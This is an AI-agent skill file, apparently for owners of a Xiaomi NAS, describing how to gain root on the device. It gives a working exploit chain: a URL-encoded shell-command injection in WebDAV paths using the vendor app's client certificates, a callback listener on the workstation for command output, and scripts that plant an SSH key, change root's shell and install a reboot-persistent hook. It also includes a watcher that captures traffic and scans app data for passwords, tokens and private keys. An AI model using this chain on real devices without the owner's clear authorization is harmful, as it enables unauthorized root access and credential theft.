---
name: xiaomi-nas-ssh-root
description: 通过小米智能存储 App 的客户端证书 + WebDAV 路径注入为用户自己的小米 NAS 开启或恢复 SSH/root，并在 Windows/Python 环境安装和验证普通整机重启后的 SSH 持久化。也用于复现“小米 NAS 稳定 SSH”流程或继续该设备的 root 调查。
---

# Xiaomi NAS SSH/root enablement via certified WebDAV injection

Use this skill when the user asks to open/enable SSH/root on their local Xiaomi NAS/RP05, or continue the local Xiaomi NAS SSH enablement process. Prefer the integrated scripts in this repo.

Safety/authorization:
- Only run against the user's own NAS on their LAN.
- Treat LAN IPs, app account/password, WebDAV password, tokens, cert private keys, and SSH private keys as sensitive. Do not expose exact IPs or secrets in chat unless the user explicitly asks.
- Never exfiltrate or print private keys except paths and fingerprints. Do not paste private key content into chat.
- Prefer dry-run/verification steps before state-changing injection.
- Record conclusions under `~/issuebase/mi-nas/` when troubleshooting, but redact exact IPs in user-facing summaries.

Runtime/owner-specific context:
- Always ask for or detect the current owner's `NAS_IP` at runtime. Do not hard-code a previous user's/device's IP into commands, scripts, pcap filenames, summaries, or chat replies.
- Derive `WORK_IP` from the active route/interface for that `NAS_IP`; do not assume a fixed subnet.
- Xiaomi NAS desktop app path on macOS is usually `/Applications/小米智能存储.app`.
- macOS cert directory is commonly inside the app bundle: `/Applications/小米智能存储.app/Contents/Resources/extraResources/cert`.
- Windows 11 app path has been observed as `C:\Program Files\SmartStorage\小米智能存储.exe`; after SMS/code login and visiting the NAS file page, certs were observed in `%LOCALAPPDATA%\minasCert`.
- Windows 11 + conda Python 3.13.15 has been validated end-to-end with the Python runner: WebDAV credentials, PUT, injection, root callback, dropbear key install, SSH verification, and local SSH config alias all completed successfully.
- Cert basename, client cert CN, server TLS CN, WebDAV username/password, tokens, and dynamic ports are per-device/per-login. Discover them for the current owner and keep them redacted in chat.
- Current app codesign may become invalid because Xiaomi/app workflows add cert resources under `Contents/Resources/extraResources/cert/`; verify but don't treat this alone as failure.
- Use Homebrew curl `/opt/homebrew/opt/curl/bin/curl`; Apple `/usr/bin/curl` may fail to load EC client keys with LibreSSL unsupported algorithm.
- Correct LuCI API path for pool info is `/cgi-bin/luci/filemgr/get_pool_info` (not `/cgi-bin/luci/admin/filemgr/get_pool_info`, which can return 403).
- Store WebDAV credentials as `username:password` in `/tmp/.wdav_creds` on bash/macOS or the OS temp directory for Python; mode 600 where supported. Never print the password in chat.
- User may need to log into the Xiaomi NAS app using account/password before monitoring; treat app-derived tokens/WebDAV credentials as sensitive secrets.
- Previous issue notes: `~/issuebase/mi-nas/`
- Ready-made runners live in this repo under `scripts/`.
- On macOS, the bash runner `scripts/enable-xiaomi-nas-ssh.sh` remains the conservative/default path.
- On Windows or cross-platform work, use the Python runner `scripts/enable-xiaomi-nas-ssh-py.py`; it has been validated on Windows 11 + conda Python 3.13.15.
- When root SSH already works and the user only wants ordinary-reboot persistence, do not rerun certificate/WebDAV enablement. With authorization to change the NAS, run `scripts/install-ssh-persistence.py`; it defaults to the `xiaomi-nas` SSH alias and accepts an explicit root SSH target and identity file.

Runner quick start:
```sh
# verified macOS bash runner
NAS_IP="<NAS_IP>" ./scripts/enable-xiaomi-nas-ssh.sh

# Python runner for cross-platform work
NAS_IP="<NAS_IP>" python3 ./scripts/enable-xiaomi-nas-ssh-py.py

# Windows examples after Xiaomi Smart Storage login/code verification and NAS visit:
# py -3 scripts\enable-xiaomi-nas-ssh-py.py --nas-ip "<NAS_IP>" --cert-dir "$env:LOCALAPPDATA\minasCert"
# P:\Anaconda3\envs\nas-root-py313\python.exe scripts\enable-xiaomi-nas-ssh-py.py --nas-ip "<NAS_IP>" --cert-dir "$env:LOCALAPPDATA\minasCert"

# Windows/Python persistence-only path after root SSH is already available
# P:\Anaconda3\envs\nas-root-py313\python.exe scripts\install-ssh-persistence.py
# P:\Anaconda3\envs\nas-root-py313\python.exe scripts\install-ssh-persistence.py root@"<NAS_IP>" -i "$env:USERPROFILE\.ssh\id_ed25519_xiaomi_nas"

# or specify any non-default app cert directory
python3 ./scripts/enable-xiaomi-nas-ssh-py.py --nas-ip "<NAS_IP>" --cert-dir "<cert-dir>"
```

Required inputs:
- `NAS_IP`: NAS LAN IP. Keep exact value local/redacted in chat.
- `CN`: certificate DNS/common name used with `--resolve`.
- cert files copied from the Xiaomi NAS client cert directory, four `.pem` files:
  - `<UID>_<SERIAL>_cert.pem`
  - `<UID>_<SERIAL>_private_key.pem`
  - `<UID>_<SERIAL>_csr.pem`
  - `ca_chain.pem`
- `USERNAME`: NAS API/WebDAV response username, also used in `/nas/pool0/<USERNAME>/data/Docker/...`.
- `CREDS`: WebDAV `username:password` from API response.
- `WORK_IP`: workstation LAN IP reachable by NAS, e.g. `hostname -I` or `ipconfig getifaddr en0`.

Cert preparation:
```sh
NAS_IP="<NAS_IP>"
WORK_IP="$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)"
CERT_DIR="/tmp/minascert"
mkdir -p "$CERT_DIR" && chmod 700 "$CERT_DIR"
chmod 600 "$CERT_DIR"/*.pem
ls "$CERT_DIR"/*.pem   # expect 4 files
```

Derive `<UID>_<SERIAL>` from filenames:
```sh
CERT_BASENAME="$(basename "$(ls "$CERT_DIR"/*_cert.pem | head -1)" _cert.pem)"
CLIENT_CERT="$CERT_DIR/${CERT_BASENAME}_cert.pem"
CLIENT_KEY="$CERT_DIR/${CERT_BASENAME}_private_key.pem"
CA_CERT="$CERT_DIR/ca_chain.pem"
```

Derive/verify CN if possible:
```sh
openssl x509 -in "$CLIENT_CERT" -noout -subject -issuer -dates
# If the owner already knows the CN, use that exact DNS name.
```

Set curl cert args:
```sh
CN="<CN>"
CERT_ARGS="--cacert $CA_CERT --cert $CLIENT_CERT --key $CLIENT_KEY --resolve $CN:443:$NAS_IP"
CERT_ARGS_WD="--cacert $CA_CERT --cert $CLIENT_CERT --key $CLIENT_KEY --resolve $CN:5000:$NAS_IP"
```

Get WebDAV credentials:
```sh
curl -s $CERT_ARGS -X POST -d '{"selector":["webDAV"]}' \
  "https://$CN/cgi-bin/luci/filemgr/get_pool_info" | python3 -m json.tool
# Extract response webDAV fields: username, password, port=5000.

echo "<username>:<password>" > /tmp/.wdav_creds && chmod 600 /tmp/.wdav_creds
CREDS="$(cat /tmp/.wdav_creds)"
USERNAME="<username>"
```

Verify WebDAV upload:
```sh
echo hi > /tmp/test.txt
curl -s -u "$CREDS" $CERT_ARGS_WD -T /tmp/test.txt \
  "https://$CN:5000/pool0/data/test.txt" -w 'PUT: %{http_code}\n' -o /dev/null
# Expected: PUT: 204
```

Listener for command output:
```sh
cat >/tmp/nas_listener.py <<'PY'
import socket, sys, time
HOST='0.0.0.0'; PORT=8124
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT)); s.listen(5); s.settimeout(40)
print(f'LISTEN {HOST}:{PORT}', flush=True)
try:
    c,a=s.accept(); print('FROM', a, flush=True); c.settimeout(3)
    chunks=[]
    while True:
        try:
            d=c.recv(65535)
        except socket.timeout:
            break
        if not d: break
        chunks.append(d)
    data=b''.join(chunks)
    sys.stdout.buffer.write(data); sys.stdout.flush()
finally:
    s.close()
PY
kill "$(cat /tmp/nas_listen.pid 2>/dev/null)" 2>/dev/null || true; sleep 1
nohup python3 /tmp/nas_listener.py > /tmp/nas_listen_out.txt 2>&1 &
echo $! > /tmp/nas_listen.pid
sleep 1
```

Injection primitives:
- The WebDAV URL path begins under `/pool0/video/` and ends `__.ts`.
- Shell commands are injected by URL-encoded `bash -c` style payloads.
- Paths containing `/` must not appear raw in the command payload; construct them with encoded `printf` sequences.
- After each injection, check `/tmp/nas_listen_out.txt`.

Low-risk tests:
```sh
# 3-second delay test; expected curl elapsed around 3 seconds.
P="/pool0/video/__x%22%3Bsleep%203%3B%22__.ts"
time curl -s -o /dev/null --max-time 15 -g -u "$CREDS" $CERT_ARGS_WD "https://$CN:5000$P"

# docker ps output回传: use the exact encoded form from the integrated runner.
# Expected: listener output includes docker ps table.
```

SSH key generation/upload:
```sh
ssh-keygen -t ed25519 -f /tmp/nas-root-key -N '' -C "nas-root-$(date +%F)"
chmod 600 /tmp/nas-root-key
cat /tmp/nas-root-key.pub

curl -s -u "$CREDS" $CERT_ARGS_WD -T /tmp/nas-root-key.pub \
  "https://$CN:5000/pool0/data/Docker/authorized_keys" -o /dev/null
```

NAS-side script to append key to dropbear authorized_keys:
```sh
cat >/tmp/setkey.sh <<'SH'
#!/bin/sh
mkdir -p /etc/dropbear
touch /etc/dropbear/authorized_keys
while IFS= read -r line; do
    grep -qxF "$line" /etc/dropbear/authorized_keys 2>/dev/null || echo "$line" >> /etc/dropbear/authorized_keys
done < /nas/pool0/<USERNAME>/data/Docker/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
echo KEY_OK
SH
# replace <USERNAME>, upload to /pool0/data/Docker/setkey.sh, then trigger via injection and expect KEY_OK.
```

NAS-side script to change root shell:
```sh
cat >/tmp/setshell.sh <<'SH'
#!/bin/sh
mkdir -p /runtime 2>/dev/null || true
cp /etc/passwd /runtime/passwd.bak-pre-ssh 2>/dev/null || cp /etc/passwd /tmp/passwd.bak-pre-ssh 2>/dev/null || true
usermod -s /bin/sh root
echo SHELL_OK
SH
# upload to /pool0/data/Docker/setshell.sh, trigger via injection, expect SHELL_OK.
```

Enable Dropbear for the current boot with `systemctl start dropbear.socket`. Do not treat
`mitee_tool rpmb set ssh_en true` as successful: the command requires a second signed
challenge response and a plain non-interactive call fails verification. The vendor boot
check can therefore stop Dropbear after reboot. Once root SSH is available, use the
Python persistence installer below instead of rerunning certificate/WebDAV enablement.

Verify:
```sh
nc -vz -G 2 "$NAS_IP" 22
ssh -i /tmp/nas-root-key -o StrictHostKeyChecking=accept-new root@"$NAS_IP" id
# Expected: uid=0(root) gid=0(root) ...
```

Post-enable Windows/Python persistence installer:
```powershell
P:\Anaconda3\envs\nas-root-py313\python.exe .\scripts\install-ssh-persistence.py
# Or without a configured alias:
P:\Anaconda3\envs\nas-root-py313\python.exe .\scripts\install-ssh-persistence.py `
  root@'<NAS_IP>' -i "$env:USERPROFILE\.ssh\id_ed25519_xiaomi_nas"
```
Run this only with authorization to modify the NAS. It atomically installs the validated
`98.ssh-persistence` pool hook, verifies its `/data/etc/upper` copy, and keeps current SSH
active. `PERSISTENCE_READY` proves installation and current runtime health, not reboot
persistence. The installer never reboots the NAS; require separate user authorization for
a whole-device reboot and validate a new boot ID, old-key login, and current-boot journal.

Integrated step-by-step runners:
```sh
# macOS bash runner; prints [step] + OK/WARN/FAIL after each stage.
NAS_IP='<NAS_IP>' ./scripts/enable-xiaomi-nas-ssh.sh
# or: ./scripts/enable-xiaomi-nas-ssh.sh '<NAS_IP>'

# Python runner, validated on Windows 11 + conda Python 3.13.15.
NAS_IP='<NAS_IP>' python3 ./scripts/enable-xiaomi-nas-ssh-py.py
```
Notes for the runner:
- It must receive the current owner's NAS IP at runtime.
- It stores WebDAV credentials in `/tmp/.wdav_creds` mode 600 and does not print the password.
- It stores root SSH key at `/tmp/nas-root-key`; never print/delete the private key.
- It redacts `NAS_IP`/`WORK_IP` from its command-capture output.
- It verifies, in order: certs, ports, WebDAV credentials, WebDAV PUT, listener, sleep injection, root id, key upload, `authorized_keys`, root shell, dropbear, SSH root id, local SSH config alias.
- The existing full Python runner proves current-boot SSH only. Run the separate persistence installer after SSH verification when ordinary-reboot persistence is requested and authorized.
- It copies the root key to `~/.ssh/id_ed25519_xiaomi_nas` and writes/updates this local SSH config block:
  ```sshconfig
  Host xiaomi-nas minas
      HostName <NAS_IP>
      User root
      IdentityFile ~/.ssh/id_ed25519_xiaomi_nas
      IdentitiesOnly yes
      StrictHostKeyChecking accept-new
      ConnectTimeout 8
  ```
  Then verify with `ssh xiaomi-nas id`.

Monitoring/recovery procedure used to discover app runtime paths and credentials:
```sh
# Prefer the repo script:
./scripts/watch-xiaomi-nas-app.sh
```
If that script is missing from the checkout, recreate a compact version from this embedded template under `~/issuebase/mi-nas/scripts/`. Keep exact IP local; pass it through `NAS_IP=...` and do not print it in chat:
```sh
mkdir -p "$HOME/issuebase/mi-nas/scripts"
cat > "$HOME/issuebase/mi-nas/scripts/watch-xiaomi-nas-app.sh" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
: "${NAS_IP:?set NAS_IP to the local NAS address}"
APP_NAME="${APP_NAME:-小米智能存储}"
IFACE="${IFACE:-$(ifconfig | awk '/^[a-z0-9]+: flags=/{gsub(":","",$1); i=$1} /inet / && $2 !~ /^127\./{print i; exit}')}"
ROOT_DIR="${ROOT_DIR:-$HOME/issuebase/mi-nas/captures/app-watch-$(date +%Y%m%d-%H%M%S)}"
APP_SUPPORT="$HOME/Library/Application Support/$APP_NAME"
APP_BUNDLE="/Applications/$APP_NAME.app"
mkdir -p "$ROOT_DIR"
PCAP="$ROOT_DIR/nas-redacted.pcap"
CONN_LOG="$ROOT_DIR/connections.log"
SUMMARY="$ROOT_DIR/summary.txt"
cat > "$SUMMARY" <<EOF
Xiaomi NAS app watch
started: $(date)
NAS_IP: <redacted>
IFACE: $IFACE
APP_NAME: $APP_NAME
APP_BUNDLE: $APP_BUNDLE
APP_SUPPORT: $APP_SUPPORT
PCAP: $PCAP
EOF
cleanup(){
  [[ -n "${TCPDUMP_PID:-}" ]] && kill "$TCPDUMP_PID" 2>/dev/null || true
  [[ -n "${LOOP_PID:-}" ]] && kill "$LOOP_PID" 2>/dev/null || true
  wait 2>/dev/null || true
  {
    echo "finished: $(date)"
    echo "Recent cert files:"
    find "$APP_BUNDLE" "$APP_SUPPORT" -maxdepth 8 \( -iname '*_cert.pem' -o -iname '*_private_key.pem' -o -iname '*_csr.pem' -o -iname 'ca_chain.pem' \) -print 2>/dev/null | sort
    echo "Recent WebDAV-ish strings from app data:"
    find "$APP_SUPPORT" -maxdepth 6 -type f -print0 2>/dev/null | xargs -0 strings -a 2>/dev/null | rg -i 'webdav|baseurl|username|password|shareDeviceToken|deviceCurrentInfo|pool0|nas\.' | head -200 || true
  } >> "$SUMMARY"
  echo "saved: $ROOT_DIR"
}
trap cleanup INT TERM EXIT
sudo tcpdump -i "$IFACE" -n -s 0 -w "$PCAP" "host $NAS_IP and (tcp port 443 or tcp port 5000 or tcp port 22 or tcp port 8086 or tcp port 36673 or portrange 30000-65535)" >"$ROOT_DIR/tcpdump.log" 2>&1 &
TCPDUMP_PID=$!
(
  while true; do
    {
      echo "===== $(date) ====="
      ps axww -o pid,ppid,user,command | rg -i "$APP_NAME|sso_login|MiNas|SmartStorage" || true
      lsof -nP -iTCP | rg "$NAS_IP|$APP_NAME|sso_login" || true
      find "$APP_BUNDLE" "$APP_SUPPORT" -maxdepth 8 \( -iname '*_cert.pem' -o -iname '*_private_key.pem' -o -iname '*_csr.pem' -o -iname 'ca_chain.pem' -o -iname '*.ldb' -o -iname '*.log' \) -print 2>/dev/null | while read -r f; do stat -f '%Sm %z %N' -t '%F %T' "$f" 2>/dev/null; done | sort | tail -80 || true
    } >> "$CONN_LOG" 2>&1
    sleep 1
  done
) &
LOOP_PID=$!
echo "watching; quit/reopen app, enter file manager, then Ctrl-C. Output: $ROOT_DIR"
while true; do sleep 3600; done
SH
chmod +x "$HOME/issuebase/mi-nas/scripts/watch-xiaomi-nas-app.sh"
```
Procedure:
1. Start the watcher in iTerm2, not Apple Terminal. Always set the owner's current NAS IP at run time; do not hard-code another user's IP:
   ```sh
   ~/.grok/skills/prefer-iterm2/scripts/open-iterm.sh \
     "$HOME/issuebase/mi-nas/scripts" "NAS_IP='<NAS_IP>' ./watch-xiaomi-nas-app.sh"
   # or: ./watch-xiaomi-nas-app.sh '<NAS_IP>'
   ```
2. Enter sudo password for tcpdump if prompted.
3. Quit/reopen `/Applications/小米智能存储.app`.
4. Log in with the user's Xiaomi account/password if needed; do not record or expose that password.
5. Enter the NAS file manager page and wait 10–20 seconds.
6. Stop watcher with Ctrl-C.
7. Analyze latest `~/issuebase/mi-nas/captures/app-watch-*/`:
   - `connections.log`: app/sso_login processes and NAS dynamic ports.
   - `nas-<NAS_IP>.pcap`: encrypted traffic metadata; useful for ports/timing, not plaintext TLS credentials.
   - cert files under app bundle: `Contents/Resources/extraResources/cert/`.

Observed from monitoring:
- `sso_login` connects to NAS dynamic ports, e.g. `<NAS_IP>:<dynamic-port>`.
- The certs were regenerated under the app bundle after login.
- App code stores cert path inside `extraResources/cert`.

Validated root command execution primitive:
```sh
# Keep actual password in /tmp/.wdav_creds and never echo it in chat.
# Use URL path injection over WebDAV 5000.
# 3 second sleep test should take ~3 seconds.
# A root id回连 test returned: uid=0(root) gid=0(root), shell=/usr/sbin/mi-shell.
```

Do not delete `/tmp/nas-root-key`; it is the root SSH identity for this NAS. Keep it private.
